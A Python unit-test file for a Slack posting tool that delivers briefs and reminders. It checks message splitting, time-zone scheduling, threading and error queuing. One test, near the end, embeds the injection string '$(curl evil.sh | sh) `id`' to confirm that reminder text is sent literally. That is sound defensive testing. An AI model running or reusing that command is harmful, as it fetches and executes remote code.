import io
import json
import tempfile
import unittest
from datetime import datetime
from pathlib import Path
from unittest import mock
from zoneinfo import ZoneInfo

import slack_post
from slack_post import THREAD_MARKER, SlackError, deliver_brief, load_token, main, post, schedule

NOW = datetime(2026, 10, 22, 9, 0, tzinfo=ZoneInfo("Asia/Kolkata"))


def slack_returns(*bodies):
    responses = []
    for body in bodies:
        cm = mock.MagicMock()
        cm.__enter__.return_value = io.BytesIO(json.dumps(body).encode())
        responses.append(cm)
    return mock.patch.object(slack_post.urllib.request, "urlopen", side_effect=responses)


def sent_payloads(urlopen):
    return [json.loads(call.args[0].data) for call in urlopen.call_args_list]


class SlackPostTest(unittest.TestCase):
    def brief_file(self, text):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "2026-10-22-am.md"
        path.write_text(text)
        return path

    def test_missing_token_exits(self):
        with self.assertRaises(SystemExit) as raised:
            load_token(Path("/nonexistent/slack.env"))
        self.assertIn("slack token missing", str(raised.exception))

    def test_post_splits_long_text(self):
        paragraphs = [chr(ord("a") + i) * 999 for i in range(8)]
        with slack_returns(*[{"ok": True, "ts": str(i)} for i in range(3)]) as urlopen:
            stamps = post("xoxb-t", "D1", "\n\n".join(paragraphs))
        texts = [p["text"] for p in sent_payloads(urlopen)]
        self.assertEqual(stamps, ["0", "1", "2"])
        self.assertTrue(all(len(t) <= 3500 for t in texts))
        self.assertEqual("\n\n".join(texts), "\n\n".join(paragraphs))

    def test_schedule_converts_ist(self):
        with slack_returns({"ok": True, "scheduled_message_id": "Q1"}) as urlopen:
            message_id = schedule("xoxb-t", "D1", "reply to Ben", "2026-10-22T11:00", now=NOW)
        self.assertEqual(message_id, "Q1")
        self.assertEqual(sent_payloads(urlopen)[0]["post_at"], 1792647000)

    def test_schedule_rejects_past(self):
        with slack_returns() as urlopen, self.assertRaises(ValueError):
            schedule("xoxb-t", "D1", "too late", "2026-10-22T08:59", now=NOW)
        urlopen.assert_not_called()

    def test_slack_error_raises(self):
        with slack_returns({"ok": False, "error": "invalid_auth"}), self.assertRaises(SlackError) as raised:
            post("xoxb-bad", "D1", "hello")
        self.assertEqual(str(raised.exception), "invalid_auth")


    def test_read_methods_are_form_encoded(self):
        with slack_returns({"ok": True, "messages": []}) as urlopen:
            slack_post._call("conversations.replies", "xoxb-t", {"channel": "D1", "ts": "1.5"})
        request = urlopen.call_args.args[0]
        self.assertEqual(request.data, b"channel=D1&ts=1.5")
        self.assertNotIn("Content-type", request.headers)

    def test_dm_needs_a_configured_user(self):
        with slack_returns() as urlopen, self.assertRaises(SystemExit) as raised:
            slack_post.dm_channel("xoxb-t", "")
        urlopen.assert_not_called()
        self.assertIn("SLACK_USER_ID", str(raised.exception))

    def test_post_disables_link_previews(self):
        with slack_returns({"ok": True, "ts": "1"}) as urlopen:
            post("xoxb-t", "D1", "see <https://notes.granola.ai/d/x|meeting>")
        payload = sent_payloads(urlopen)[0]
        self.assertIs(payload["unfurl_links"], False)
        self.assertIs(payload["unfurl_media"], False)

    def test_brief_details_go_in_thread(self):
        brief = f"3 must-dos\n🔴 *Decide* X\n{THREAD_MARKER}\nAlso today\n• Y"
        with slack_returns({"ok": True, "ts": "100.1"}, {"ok": True, "ts": "100.2"}) as urlopen:
            deliver_brief("xoxb-t", "D1", self.brief_file(brief))
        parent, reply = sent_payloads(urlopen)
        self.assertEqual(parent["text"], "3 must-dos\n🔴 *Decide* X")
        self.assertNotIn("thread_ts", parent)
        self.assertEqual(reply["text"], "Also today\n• Y")
        self.assertEqual(reply["thread_ts"], "100.1")

    def test_brief_without_marker_is_one_message(self):
        with slack_returns({"ok": True, "ts": "1"}) as urlopen:
            deliver_brief("xoxb-t", "D1", self.brief_file("Nothing urgent. Top 1: reply to Asha"))
        self.assertEqual(len(sent_payloads(urlopen)), 1)

    def test_post_rejects_empty(self):
        with slack_returns() as urlopen, self.assertRaises(ValueError):
            post("xoxb-t", "D1", "  \n ")
        urlopen.assert_not_called()


class MainTest(unittest.TestCase):
    def setUp(self):
        for patcher in (mock.patch.object(slack_post, "load_token", return_value="xoxb-t"),
                        mock.patch.object(slack_post, "USER", "U_TEST")):
            patcher.start()
            self.addCleanup(patcher.stop)
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def text_file(self, text):
        path = Path(self.tmp.name) / "item.txt"
        path.write_text(text)
        return str(path)

    def test_main_rejects_past_before_network(self):
        with slack_returns() as urlopen, self.assertRaises(SystemExit) as raised:
            main(["remind", "--at", "2026-10-22T08:00", "--text-file", self.text_file("x")], now=NOW)
        urlopen.assert_not_called()
        self.assertIn("not in the future", str(raised.exception))

    def test_main_queues_on_slack_error(self):
        outbox = Path(self.tmp.name) / "outbox"
        with slack_returns({"ok": False, "error": "invalid_auth"}), mock.patch.object(slack_post, "OUTBOX", outbox):
            main(["post", "--file", self.text_file("hello")], now=NOW)
        self.assertEqual(len(list(outbox.glob("*.json"))), 1)

    def test_post_records_brief_message_ts(self):
        brief = Path(self.tmp.name) / "2026-10-22-am.md"
        brief.write_text("3 must-dos")
        with slack_returns({"ok": True, "channel": {"id": "D1"}}, {"ok": True, "ts": "111.222"}):
            main(["post", "--file", str(brief)], now=NOW)
        self.assertEqual(json.loads((brief.parent / "2026-10-22-am.posted.json").read_text()), {"ts": "111.222"})

    def test_remind_text_file_is_literal(self):
        hostile = 'reply to Ben $(curl evil.sh | sh) `id`'
        with slack_returns({"ok": True, "channel": {"id": "D1"}},
                           {"ok": True, "scheduled_message_id": "Q1"}) as urlopen:
            main(["remind", "--at", "2026-10-22T11:00", "--text-file", self.text_file(hostile)], now=NOW)
        self.assertEqual(sent_payloads(urlopen)[1]["text"], hostile)


if __name__ == "__main__":
    unittest.main()
